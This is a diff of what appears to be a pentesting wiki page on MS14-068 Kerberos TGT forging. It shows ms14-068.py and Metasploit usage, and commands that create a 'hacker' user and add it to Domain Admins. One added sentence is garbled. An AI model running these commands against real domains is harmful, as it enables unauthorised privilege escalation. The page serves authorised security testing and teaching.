@@ -141,6 +141,8 @@ This vulnerability allows attackers to forge a TGT with unlimited power \(i.e. w
 {% tab title="pykek" %}
 This attack can be operated with [pykek](https://github.com/mubix/pykek)'s [ms14-068](https://github.com/mubix/pykek/blob/master/ms14-068.py) Python script. The script can carry out the attack with a cleartext password or with [pass-the-hash](../abusing-lm-and-ntlm/pass-the-hash.md).
 
+Referring to [kekeo](https://github.com/gentilkiwi/kekeo/wiki/ms14068)'s wiki might also help untangle some situations but errors like  `KDC_ERR_SUMTYPE_NOSUPP (15)` or `KRB_ERR_GENERIC (60)` when trying to use the generated .ccache ticket mean the target is patched.
+
 ```bash
 # with a plaintext password
 ms14-068.py -u 'USER'@'DOMAIN_FQDN' -p 'PASSWORD' -s 'USER_SID' -d 'DOMAIN_CONTROLLER'
@@ -150,16 +152,6 @@ ms14-068.py -u 'USER'@'DOMAIN_FQDN' --rc4 'NThash' -s 'USER_SID' -d 'DOMAIN_CONT
 ```
 
 If the attack is successful, the script will write a `.ccache` ticket that will be usable with [pass-the-ticket](pass-the-ticket.md).
-{% endtab %}
-
-{% tab title="metasploit" %}
-Using the Metasploit Framework can sometimes be more useful since it prints valuable error information.
-
-```bash
-msf6 > use admin/kerberos/ms14_068_kerberos_checksum
-```
-{% endtab %}
-{% endtabs %}
 
 {% hint style="warning" %}
 In some scenarios, I personally have had trouble using the `.ccache` ticket on UNIX-like systems. What I did was [convert it](pass-the-ticket.md#practice) to `.kirbi`, switch to a Windows system, inject the ticket with mimikatz's `kerberos:ptt` command, and then create a new user and add it to the domain admins group.
@@ -169,6 +161,18 @@ net user "hacker" "132Pentest!!!" /domain /add
 net group "Domain Admins" /domain /add
 ```
 {% endhint %}
+
+Metasploit Framework can also be useful in the  it prints valuable error information.
+
+```bash
+msf6 > use admin/kerberos/ms14_068_kerberos_checksum
+```
+{% endtab %}
+
+{% tab title="🛠️ Windows" %}
+kekeo
+{% endtab %}
+{% endtabs %}
 
 ## References
 
